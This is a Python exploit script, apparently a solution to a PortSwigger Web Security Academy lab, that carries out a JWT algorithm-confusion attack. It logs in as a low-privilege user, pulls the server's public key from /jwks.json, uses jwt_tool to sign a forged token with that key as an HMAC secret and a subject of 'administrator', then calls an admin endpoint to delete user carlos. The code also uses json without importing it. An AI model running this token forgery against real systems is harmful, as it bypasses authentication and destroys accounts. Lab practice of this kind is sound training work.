import subprocess
import jwt
from jwcrypto import jwk
from jwt_tool import *
import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
public_key_url = burp_url + '/jwks.json'
admin_url = burp_url + '/admin'
delete_url = burp_url + '/admin/delete?username=carlos'

def jwk_to_pem(jwk_data):
    key = jwk.JWK(**jwk_data).export_to_pem()
    return key.decode()

session = requests.Session()
response = session.get(login_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)
burp_data = {"csrf": csrf,"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data, allow_redirects=False)

response = session.get(public_key_url)
n_value = re.search(r'"n":\s*"(.*?)"',response.text).group(1)

response = session.get(public_key_url)
full_public_key_from_server = re.search(r'\[(.*?)\]',response.text).group(1)

cookies = response.cookies
session_cookie = session.cookies.get('session')
jwk_dict = json.loads(full_public_key_from_server)

pem = jwk_to_pem(jwk_dict)
with open('key.pem', 'w') as file:
    file.write(pem)

command = f'python3 jwt_tool.py {session_cookie} -X k -pk key.pem -I -pc sub -pv administrator'
result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

pre_cookie = result.stdout.strip().splitlines()[-1]
admin_cookie = pre_cookie[4:]

burp_cookie = {"session": admin_cookie}
session.get(delete_url, cookies=burp_cookie)
